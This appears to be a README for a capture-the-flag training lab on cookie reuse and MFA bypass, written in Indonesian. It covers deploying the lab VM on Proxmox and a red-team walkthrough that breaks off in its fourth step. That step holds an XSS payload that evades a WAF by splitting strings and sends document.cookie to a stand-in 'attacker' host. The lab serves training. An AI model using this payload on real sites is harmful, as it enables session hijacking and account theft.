# Red vs Blue CTF — Cookies Reuse & MFA Bypass

## Deploy di Proxmox
1. Buat VM Ubuntu 22.04 (2 vCPU, 2GB RAM)
2. Copy repo ke VM: `scp -r redvsblue-lab/ user@vm:/opt/`
3. Jalankan: `sudo bash provision-vm.sh`
4. Akses: http://<vm-ip>:3075

## Red Team Walkthrough
1. `curl -I http://<vm-ip>:3075/` → lihat `X-Powered-By: Node.js`
2. Buka `/robots.txt` → temukan `/api/verify-mfa` & `/dashboard`
3. Cek cookie `pre_mfa_session` (HttpOnly=False)
4. Kirim payload XSS bypass WAF:
   ```html
   <svg onload="fetch('http://attacker/?'+window['docu'+'ment']['coo'+'kie'])">